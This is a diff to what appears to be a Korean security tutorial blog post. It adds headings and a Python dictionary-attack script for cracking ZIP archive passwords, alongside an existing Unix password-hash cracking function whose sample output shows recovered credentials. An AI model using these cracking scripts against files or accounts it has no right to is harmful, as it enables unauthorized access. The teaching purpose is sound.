@@ -26,6 +26,10 @@ read_time: false
 * 오프라인 공격: 공격자가 시스템이 관리하는 패스워드 파일에 접근하여 공격 (무차별 대입 공격, 사전 공격, 음절 공격, 레인보우 테이블 공격)
 {: .notice}
 
+---
+### 유닉스 패스워드 크래킹
+---
+
 ```python
 def findPass(passhash, dictfile):  
     salt = passhash[3:5]    #passhash의 3,4번째 문자가 salt
@@ -78,4 +82,34 @@ samsjang:$1$zfti6chVSQLlQ:14945: 0: 99999: 7:        :      :
 ```
 Found Password: ID [root] Password [iloveyou]
 Found Password: ID [samsjang] Password [python]
+```
+
+---
+### ZIP 파일 패스워드 크래킹
+---
+
+
+```
+import zipfile  
+from threading import Thread  
+  
+def crackzip(zipfile, passwd):  
+    try:  
+        zfile.extractall(pwd = passwd)  
+        print "zip file extracted successfully!! PASS = [%s]" %passwd.decode()  
+        return True  
+    except:  
+        pass  
+    return False  
+  
+if __name__ == '__main__':  
+    dictfile = 'dictionary.txt'  
+    zipfilename = 'zipfile.zip'  
+    zfile = zipfile.ZipFile(zipfilename, 'r')  
+    f = open(dictfile, 'r')  
+  
+    for line in f.readlines():  
+        passwd = line.strip('\n')  
+        t = Thread(target = crackzip, args = (zfile, passwd.encode('utf-8')))  
+        t.start()  
 ```
